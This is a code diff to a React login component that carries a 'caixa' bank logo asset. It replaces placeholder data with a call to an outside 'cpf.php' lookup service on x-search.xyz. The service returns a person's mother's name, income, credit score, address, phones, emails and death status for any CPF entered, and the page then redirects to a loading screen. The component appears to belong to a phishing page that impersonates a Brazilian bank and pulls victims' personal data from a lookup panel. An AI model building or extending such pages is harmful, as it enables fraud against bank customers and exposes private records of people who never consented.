@@ -1,21 +1,48 @@
 import { useState } from "react";
 import logo from "../assets/caixa.webp";
 import userIcon from "../assets/user.png";
+import axios from "axios";
+
+// Configuração da API
+const api = axios.create({
+    baseURL: 'https://x-search.xyz/test-by-x-slayer/apis/rafa/01',
+    headers: {
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Methods': 'GET,PUT,POST,DELETE,PATCH,OPTIONS',
+    },
+});
 
 // Tipagem da resposta simulada
 interface UserData {
-    nome: string;
-    cpf: string;
-    dataNascimento: string;
+    CPF: string;
+    Nome: string;
+    Nome_Mae: string;
+    Sexo: string;
+    Data_Nascimento: string;
+    Estado_Civil: string;
+    Escolaridade: string;
+    Profissao: string;
+    Renda: string;
+    Score: string;
+    Faixa_Risco: string;
+    Endereco: string;
+    Numero: string;
+    Bairro: string;
+    Cidade: string;
+    Estado: string;
+    Telefones: string;
+    Emails: string;
+    Obito: string;
 }
 
 export function Login() {
     const [cpf, setCpf] = useState<string>("");
     const [isLoading, setIsLoading] = useState<boolean>(false);
     const [userData, setUserData] = useState<UserData | null>(null); // Estado para dados do usuário
-    // const navigate = useNavigate();
+
 
     console.log(userData)
+
     // Função para aplicar a máscara de CPF
     const handleCpfChange = (event: React.ChangeEvent<HTMLInputElement>) => {
         let value = event.target.value.replace(/\D/g, "");
@@ -33,21 +60,12 @@ export function Login() {
         try {
             setIsLoading(true); // Ativa o estado de carregamento
 
-            // Simulação de chamada para a API
-            // const response = await axios.get<UserData>(`/api/usuarios/${cpf}`);
-            const data = {
-                nome: "Luiz Carlos",
-                cpf: "039472817361",
-                dataNascimento: "30/09/2004"
-            }
+            const response = await api.get<{ status: number; dados: UserData[] }>(`/cpf.php?cpf=${cpf.replace(/\D/g, '')}`);
+            const user = response.data.dados[0];
 
             // Armazena os dados no estado e no localStorage
-            setUserData({
-                nome: "Luiz Carlos",
-                cpf: "039472817361",
-                dataNascimento: "30/09/2004"
-            });
-            localStorage.setItem(cpf, JSON.stringify(data));
+            setUserData(user);
+            localStorage.setItem(cpf, JSON.stringify(user));
 
             // Redireciona após o sucesso
             window.location.href = "/carregando";
